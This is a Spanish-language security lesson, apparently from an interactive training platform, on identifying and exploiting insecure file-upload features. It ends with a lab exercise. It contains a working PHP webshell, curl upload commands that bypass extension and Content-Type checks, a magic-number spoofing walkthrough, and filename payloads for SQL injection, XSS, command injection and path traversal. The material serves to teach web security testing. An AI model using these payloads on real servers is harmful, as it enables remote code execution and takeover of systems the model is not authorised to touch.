# Identificación y explotación de vulnerabilidades en la carga de archivos

## Metodología general para identificar cargas de archivos inseguras

1. Identificar la función de carga de archivos en la aplicación, confirmando que se dispone de los permisos necesarios para cargar archivos.
1. Intentar descubrir dónde se almacenan los archivos y si se puede acceder a ellos después de cargarlos.
1. Intentar subir un archivo inesperado eludiendo las validaciones de extensión de archivo.
1. Intentar subir un archivo inesperado estableciendo un valor personalizado para la cabecera `Content-Type`.
1. Intentar subir un archivo inesperado manipulando el número mágico.
1. Intentar encontrar un método para renombrar un archivo ya cargado con el fin de cambiar su extensión.
1. Intentar cargar un archivo inesperado con un nombre de archivo manipulado para aprovechar vulnerabilidades de path traversal, inyección SQL, XSS o inyección de comandos.
1. Intentar cargar archivos de configuración del servidor.
1. Intentar provocar una divulgación de información para revelar cualquier dato sensible que pueda conducir a vectores de ataque alternativos.
1. Intentar subir un archivo ejecutable que ejecutará código malicioso cuando la víctima lo abra accidentalmente.

## Explotación de cargas de archivos inseguras

### Eludiendo las comprobaciones de las extensiones de archivo

* Usando letras mayúsculas (e.g., `.pHp`, `.pHP5` o `.ASP`).
* Añadiendo una extensión válida antes de la extensión de ejecución (e.g., `image.png.php` o `image.png.php5`).
* Añadiendo caracteres especiales al final (e.g., `file.php%20`, `file.php%0d%0a` o `file.php/`).
* Engañando al analizador de extensiones del lado del servidor mediante técnicas como la inserción de datos basura (*null bytes*) entre extensiones (e.g., `image.php%00.png` o `image.php\x00.png`).
* Añadiendo otra capa de extensiones (e.g., `image.png.jpg.php` o `image.php%00.png%00.jpg`).
* Anteponiendo la extensión de ejecución a la extensión válida, lo que puede ser útil en caso de errores de configuración del servidor (e.g., `image.php.png`).
* Usando NTFS `Alternate Data Stream (ADS)` en Windows insertando un carácter de dos puntos `:` después de una extensión prohibida y antes de una permitida (e.g., `image.asp:.jpg`).

#### Enviando un fichero con doble extensión mediante `curl`

* El siguiente comando `curl` puede ser utilizado para enviar un archivo `php` malicioso con doble extensión al *endpoint* `/upload`:

  ```bash
  curl -F "file=@malicious.php;filename=image.png.php" https://domain.tbl/upload
  ```
  
  * `file` es el parámetro donde el servidor espera el propio fichero.
  * `@malicious.php` es el archivo local con código dañino.

### Eludiendo la comprobación de la cabecera `Content-Type`

* Los usuarios malintencionados pueden manipular la cabecera `Content-Type` en las peticiones HTTP para eludir las validaciones que se basan en esta cabecera para determinar el tipo de archivo.
* La cabecera `Content-Type` de una petición HTTP puede modificarse para representar cualquier tipo de archivo permitido por la aplicación, independientemente de si el archivo es dañino (e.g., se puede definir `image/jpeg` para un *script* ejecutable).

#### Manipulación de la cabecera `Content-Type` con `curl`

* El siguiente comando `curl` se puede utilizar para enviar un archivo PHP malicioso mientras se falsifica la cabecera `Content-Type` para que aparezca como un archivo `jpeg`:

  ```bash
  curl -F "file=@malicious.php;type=image/jpeg" https://domain.tbl/upload
  ```

### Eludiendo las comprobaciones de número mágico

* El número mágico es una secuencia única de *bytes* situada al principio del contenido de un archivo que se utiliza para identificar el tipo de archivo, según una [lista de firmas de archivos][1]. Estos *bytes* sirven como firma para el archivo, permitiendo al sistema operativo o a las aplicaciones determinar su tipo, incluso sin basarse en la extensión del mismo:
  * Los archivos `jpeg (jpg)` empiezan por `FF D8 FF` (correspondiente a `ÿØÿÛ`).
  * Los archivos `png` empiezan por `89 50 4E 47 0D 0A 1A 0A` (correspondiente a `‰PNG␍␊␚␊`).
  * Los archivos `pdf` empiezan por `25 50 44 46 2D` (correspondiente a `%PDF-`).
  * Los archivos `zip` empiezan por `50 4B 03 04` (correspondiente a `PK␃␄`).
* Los atacantes pueden añadir fácilmente un número mágico válido a los archivos maliciosos, haciéndolos parecer legítimos. Por ejemplo, añadir la firma `%PDF-2.0` al principio de un archivo *webshell* puede engañar al sistema haciéndole creer que se trata de un archivo PDF.
  > :older_man: `webshell` es el nombre común dado a un *script* utilizado por los atacantes que, cuando se carga en un servidor web, les permite ejecutar comandos del sistema y tomar el control del servidor como si tuvieran acceso directo la línia de comandos, pero todo de forma remota a través de la web.
* La siguiente ejecución de comandos es un ejemplo demostrativo de cómo puede realizarse.
  1. En primer lugar, se muestra el contenido del fichero `webshell.php`:

      ```bash
      :~$ cat webshell.php 
      <?php system($_GET["cmd"]); ?>
      ```

  1. Seguidamente, se determina el tipo de fichero mediante el comando de sistema `file`:

      ```bash
      :~$ file webshell.php
      webshell.php: PHP script text, ASCII text
      ```

  1. Se procede a añadir el número mágico apropiado para un archivo PDF (es decir, `%PDF-2.0`) al principio del archivo:

      ```bash
      :~$ echo "%PDF-2.0$(cat webshell.php)" > webshell.php
      ```

  1. Nuevamente se muestra el contenido del fichero `webshell.php` para verificar el cambio:

      ```bash
      :~$ cat webshell.php
      %PDF-2.0<?php system($_GET["cmd"]); ?>
      ```

  1. Se visualiza el volcado hexadecimal del fichero para comprobar los *bytes* iniciales, asegurándose de que éstos corresponden a `25 50 44 46 2D` tal y como se indica en la [lista de firmas de ficheros][1]:

      ```bash
      :~$ xxd webshell.php 
      00000000: 2550 4446 2d32 2e30 3c3f 7068 7020 7379  %PDF-2.0<?php sy
      00000010: 7374 656d 2824 5f47 4554 5b22 636d 6422  stem($_GET["cmd"
      00000020: 5d29 3b20 3f3e 0a                        ]); ?>.
      ```
  
  1. Finalmente, se determina de nuevo el tipo de archivo mediante el comando `file`, y se observa como ha cambiado a PDF:

      ```bash
      :~$ file webshell.php
      webshell.php: PDF document, version 2.0
      ```

### Usando nombres de archivo manipulados para eludir comprobaciones o explotar vulnerabilidades existentes

* Los límites de los nombres de archivo pueden explotarse utilizando nombres de archivo largos para truncar las extensiones seguras. Por ejemplo, en Linux, donde la longitud máxima de los nombres de archivo es de 255 *bytes*, un nombre como `aaaa.php.png` (siendo `aaaa` una cadena más larga) podría eludir las comprobaciones en determinadas situaciones.
* Los nombres de archivo también pueden utilizarse para explotar vulnerabilidades relacionadas con la forma en que la aplicación procesa y gestiona el nombre de archivo. Por ejemplo, un nombre de archivo como `sleep(20)-- -.jpg` podría desencadenar una inyección SQL, `<svg onload=alert("XSS")>` podría conducir a XSS, y `; sleep 20;` podría dar lugar a una inyección de comandos.

#### Explotación de vulnerabilidades path traversal

* *Path traversal* es el proceso de manipulación de rutas de archivos para acceder a ubicaciones no deseadas fuera del directorio designado.
* Los usuarios maliciosos incluyen secuencias como `../` en los nombres de archivo para atravesar directorios y almacenar archivos en ubicaciones no deseadas. Por ejemplo, un nombre de archivo como `../../../../var/www/html/index.php` ubicaría el archivo en la raíz web, sustituyendo potencialmente el contenido principal real de la aplicación web, al que posteriormente se podría acceder y ejecutar a través de una URL.

### Cargando archivos de configuración del servidor

* Dependiendo del servidor web que aloje la aplicación, un usuario malicioso podría cargar archivos de configuración como `.htaccess` para Apache o `web.config` para IIS, alterando potencialmente el comportamiento del servidor.

### Recopilando información sensible

* Descubriendo la carpeta de carga o de almacenamiento y obteniendo acceso a todos los archivos, recuperando todos los datos almacenados.
* Cargando un archivo cuyo nombre coincide con el de un archivo o carpeta ya existente.
* Cargando el mismo archivo varias veces simultáneamente y con el mismo nombre de archivo.
* Cargando un archivo en Windows con un nombre de archivo que contiene caracteres no válidos como `|`, `<`, `>`, `*`, `?` o `"`.
* Cargando un archivo en Windows que utiliza nombres reservados como `AUX`, `COM1`, `COM2`, `COM3`, `COM4`, `COM5`, `COM6`, `COM7`, `COM8`, `COM9`, `CON`, `LPT1`, `LPT2`, `LPT3`, `LPT4`, `LPT5`, `LPT6`, `LPT7`, `LPT8`, `LPT9`, `NUL` o `PRN`.

### Provocando una denegación de servicio (DoS)

* Si una aplicación web no limita el tamaño de los archivos, un usuario malicioso puede cargar archivos de gran tamaño, provocando el agotamiento de los recursos.
* Se puede conseguir un comportamiento similar cargando o descargando varios archivos sin ningún tipo de limitación de ancho de banda.

## Ejercicio para practicar :writing_hand:

* El siguiente formulario de carga de archivos es vulnerable a `Remote Code Execution (RCE)`, lo que significa que es posible subir un archivo que puede ser utilizado para ejecutar código arbitrario en el servidor.
* Al acceder al editor de código mediante el botón `Open Code Editor`, está disponible una línea de comandos junto con un archivo llamado `webshell.php`, ubicado en `/home/coder/app/webshell.php`, que podría permitir la ejecución de código arbitrario en el servidor si se logra cargar.
* El objetivo aquí es **utilizar la línea de comandos proporcionada en el editor de código** para cargar, usando `curl`, el archivo `webshell.php` a través de una petición HTTP POST al *endpoint* `/upload`:

  ```bash
  curl -F "file=@webshell.php" $APP_URL/upload
  ```

* Sin embargo, existe una débil medida de seguridad que restringe la subida de archivos a las extensiones `.jpg`, `.jpeg` y `.png`, tal y como se muestra a continuación, la cual debe ser eludida para subir el archivo `webshell.php`:

  ```bash
  coder@localhost:~/app$ curl -F "file=@webshell.php" $APP_URL/upload
  { "message" : "File type not allowed" }
  ```

* Solamente después de eludir esta medida de seguridad mediante alguna de las técnicas mostradas más arriba y subir con éxito el archivo al servidor, que es tu tarea, es momento de usar el archivo `webshell.php` para ejecutar arbitráriamente el comando `validate` con el fin de completar el ejercicio:

  ```bash
  curl $APP_URL/uploads/<webshell_file>?cmd=validate
  ```

  * Además de `validate`, será posible ejecutar cualquier comando soportado como `whoami`, `ls` o `pwd` al igual que en un terminal común.
  * Destacar que `/upload` es el *endpoint* para subir archivos, mientras que `/uploads/` es el directorio donde se almacenan los archivos subidos.
* ¿Serás capaz de eludir la medida de seguridad y ejecutar el comando `validate` a través del archivo `webshell.php` para completar el ejercicio?
  @@ExerciseBox@@

[1]: https://en.wikipedia.org/wiki/List_of_file_signatures
